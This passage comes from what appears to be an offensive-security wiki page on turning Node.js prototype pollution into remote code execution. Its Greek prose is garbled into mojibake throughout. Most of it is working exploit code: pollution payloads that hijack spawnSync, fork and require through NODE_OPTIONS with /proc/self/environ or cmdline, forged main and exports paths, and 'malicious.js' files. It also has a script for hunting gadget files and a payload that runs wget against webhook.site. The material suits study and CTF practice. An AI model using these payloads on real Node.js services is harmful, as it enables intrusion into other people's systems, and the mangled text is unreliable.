var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>spawnSync</code> ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of node
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawnSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawnSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - working
// NOT working after kEmptyObject (fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/spawnSync-stdin}\n'
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)

// Windows
// NOT working after require(fix) without options
const { spawnSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawnSync('something');
//var proc = spawnSync('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

## Î•Î¾Î±Î½Î±Î³ÎºÎ±ÏƒÎ¼ÏŒÏ‚ Spawn

Î£Ï„Î± Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÎ¯Î´Î±Ï„Îµ Ï€ÏÏ‚ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… gadget Ï€Î¿Ï… **ÎºÎ±Î»ÎµÎ¯ Ï„Î¿ `spawn`** Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¯Î½Î±Î¹ **Ï€Î±ÏÏŒÎ½** (ÏŒÎ»ÎµÏ‚ Î¿Î¹ Î¼Î­Î¸Î¿Î´Î¿Î¹ Ï„Î¿Ï… **`child_process`** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ ÎºÎ¬Ï„Î¹ Ï„Î¿ ÎºÎ±Î»Î¿ÏÎ½). Î£Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ **Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±**, Î±Î»Î»Î¬ Ï„Î¹ Î³Î¯Î½ÎµÏ„Î±Î¹ Î±Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ **Î´ÎµÎ½ Ï„Î¿ ÎºÎ±Î»ÎµÎ¯**.

### ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ require

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ [**Î¬Î»Î»Î¿ Î¬ÏÎ¸ÏÎ¿**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏŒÏ€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î­Î½Î± **`require`**. Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î±Ï€Î»Î¬ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± **Î²ÏÎµÎ¹ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ `.js` Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î±** Ï€Î¿Ï… Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ spawn ÏŒÏ„Î±Î½ ÎµÎ¹ÏƒÎ±Ï‡Î¸ÎµÎ¯**.\
ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎºÎ¿Î¹Î½ÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï€Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· spawn ÏŒÏ„Î±Î½ ÎµÎ¹ÏƒÎ±Ï‡Î¸Î¿ÏÎ½ ÎµÎ¯Î½Î±Î¹:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* Î’ÏÎµÎ¯Ï„Îµ **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰**

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î±Ï€Î»ÏŒ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î¸Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ **ÎºÎ»Î®ÏƒÎµÎ¹Ï‚** Î±Ï€ÏŒ **child\_process** **Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î¼Î¯Î± Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ·** (Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Î· ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ Î¼Î­ÏƒÎ± ÏƒÎµ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>Î•Î½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î²ÏÎ­Î¸Î·ÎºÎ±Î½ Î±Ï€ÏŒ Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ script</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### ÎŸÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï„Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼ÏŒÎ»Ï…Î½ÏƒÎ·Ï‚

{% hint style="warning" %}
Î— **Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î±Ï€Î±Î¹Ï„ÎµÎ¯** Ï„Î¿Î½ **Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚ Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï…** Ï€Î¿Ï… Î¸Î± Î³Î¯Î½ÎµÎ¹ **Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î¿**. Î‘Î»Î»Î¬ Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¹ÏƒÏ‡ÏÎµÎ¹ Ï€Î¬Î½Ï„Î±.
{% endhint %}

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± require Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼ÏŒÎ»Ï…Î½ÏƒÎ·, Î±ÎºÏŒÎ¼Î· ÎºÎ¹ Î±Î½ **Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚** Ï€Î¿Ï… Î¸Î± Î±Ï€Î±Î¹Ï„Î·Î¸ÎµÎ¯, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± ÎµÎ¾Î±Î½Î±Î³ÎºÎ¬ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎºÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ·Ï‚ Ï„Î·Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼ÏŒÎ»Ï…Î½ÏƒÎ·Ï‚**. ÎˆÏ„ÏƒÎ¹, Î±ÎºÏŒÎ¼Î· ÎºÎ¹ Î±Î½ Î· Î³ÏÎ±Î¼Î¼Î® ÎºÏÎ´Î¹ÎºÎ± ÎµÎ¯Î½Î±Î¹ ÏŒÏ€Ï‰Ï‚ `require("./a_file.js")` Î® `require("bytes")`, Î¸Î± **Î±Ï€Î±Î¹Ï„Î·Î¸ÎµÎ¯ Ï„Î¿ Ï€Î±ÎºÎ­Ï„Î¿ Ï€Î¿Ï… Î¼Î¿Î»ÏÎ½Î±Ï„Îµ**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± require ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼ÏŒÎ»Ï…Î½ÏƒÎ· ÏƒÎ±Ï‚ ÎºÎ±Î¹ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· spawn, Î±Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ·:

* Î’ÏÎµÎ¯Ï„Îµ Î­Î½Î± **Î±ÏÏ‡ÎµÎ¯Î¿ `.js` Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î±** Ï€Î¿Ï… ÏŒÏ„Î±Î½ **Î±Ï€Î±Î¹Ï„Î·Î¸ÎµÎ¯** Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Ï„Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ `child_process`**
* Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î·Î½ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Ï€Î¿Ï… ÎµÏ€Î¹Ï„Î¯Î¸ÎµÏƒÏ„Îµ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÎ±Î½ Î±Ï…Ï„ÏŒ
* ÎœÎ¿Î»ÏÎ½ÎµÏ„Îµ Ï„Î¹Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ Î³Î¹Î± Î½Î± **Î±Î½Î±Î³ÎºÎ¬ÏƒÎµÏ„Îµ Ï„Î·Î½ Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `.js`** Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Ï„Î¹ Î¼Îµ Ï„Î¿ child\_process
* **ÎœÎ¿Î»ÏÎ½ÎµÏ„Îµ Ï„Î¿ environ/cmdline** Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ„Î±Î½ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ child\_process (Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Î±ÏÏ‡Î¹ÎºÎ­Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚)

#### Î‘Ï€ÏŒÎ»Ï…Ï„Î· Î±Ï€Î±Î¯Ï„Î·ÏƒÎ·

Î‘Î½ Î· Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½Ï„Î¿Î»Î® ÎµÎ¯Î½Î±Î¹ **Î±Ï€ÏŒÎ»Ï…Ï„Î·** (`require("bytes")`) ÎºÎ±Î¹ Ï„Î¿ **Ï€Î±ÎºÎ­Ï„Î¿ Î´ÎµÎ½ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ main** ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `package.json`, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î¼Î¿Î»ÏÎ½ÎµÏ„Îµ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ `main`** ÎºÎ±Î¹ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î·Î½ **Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### Î£Ï‡ÎµÏ„Î¹ÎºÎ® Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· - 1

Î•Î¬Î½ Ï†Î¿ÏÏ„ÏÎ½ÎµÏ„Î±Î¹ Î­Î½Î± **ÏƒÏ‡ÎµÏ„Î¹ÎºÏŒ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹** Î±Î½Ï„Î¯ Î³Î¹Î± Î­Î½Î± Î±Ï€ÏŒÎ»Ï…Ï„Î¿ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ Î½Î± **Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Î­Î½Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹**:

{% tabs %}
{% tab title="ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Î£Ï‡ÎµÏ„Î¹ÎºÎ® Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· - 2

{% tabs %}
{% tab title="ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Î£Ï‡ÎµÏ„Î¹ÎºÎ® Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· - 3

Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î·, Î±Ï…Ï„Î® Î²ÏÎ­Î¸Î·ÎºÎµ ÏƒÏ„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs).
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## Î£Ï…ÏƒÎºÎµÏ…Î­Ï‚ VM

Î£Ï„Î¿ Î¬ÏÎ¸ÏÎ¿ [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ ÏŒÏ„Î¹ Î¿ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï„Î¿Ï… **`contextExtensions`** Î±Ï€ÏŒ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Ï„Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ **`vm`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï‰Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ Î¿Î¹ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ **`child_process`**, Î­Ï‡ÎµÎ¹ Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯ ÏƒÏ„Î¹Ï‚ Ï€Î¹Î¿ Ï€ÏÏŒÏƒÏ†Î±Ï„ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚.

## Î”Î¹Î¿ÏÎ¸ÏÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„ÎµÏ‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚

Î Î±ÏÎ±ÎºÎ±Î»Ï, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î· Ï€ÏÎ¿ÏƒÎ²Î¿Î»Î® Ï„Î·Ï‚ Ï€ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î·Ï‚ ÏÏÏ€Î±Î½ÏƒÎ·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎµÎ¬Î½ Ï„Î¿ **Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ** ÎµÎ½ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏÎ½ÎµÏ„Î±Î¹ ÎµÎ¯Î½Î±Î¹ **Î±Ï€ÏÎ¿ÏƒÎ´Î¹ÏŒÏÎ¹ÏƒÏ„Î¿**. Î•Î¬Î½ ÏƒÏ„Î¿Î½ **ÎºÏÎ´Î¹ÎºÎ±** Î±Ï…Ï„ÏŒ Ï„Î¿ **Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ** Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î¼Î¹Î± **Ï„Î¹Î¼Î®**, Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ.

Î‘Ï€ÏŒ Ï„Î¿Î½ Î™Î¿ÏÎ½Î¹Î¿ Ï„Î¿Ï… 2022 Î±Ï€ÏŒ [**Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±Î»Î»Î±Î³Î®**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `options` Î±Î½Ï„Î¯ Î³Î¹Î± `{}` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **`kEmptyObject`**. Î‘Ï…Ï„ÏŒ **Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î· ÏÏÏ€Î±Î½ÏƒÎ·** Î±Ï€ÏŒ Ï„Î¿ Î½Î± ÎµÏ€Î·ÏÎµÎ¬ÏƒÎµÎ¹ Ï„Î± **Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬** Ï„Ï‰Î½ **`options`** Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ RCE.\
Î¤Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· v18.4.0 Î±Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± Î­Ï‡ÎµÎ¹ **ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„ÎµÎ¯**, ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î¿Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚ `spawn` ÎºÎ±Î¹ `spawnSync` Ï€Î¿Ï… ÎµÏ€Î·ÏÎµÎ¬Î¶Î¿Ï…Î½ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ Ï€Î»Î­Î¿Î½ (ÎµÎ¬Î½ Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ `options`!).

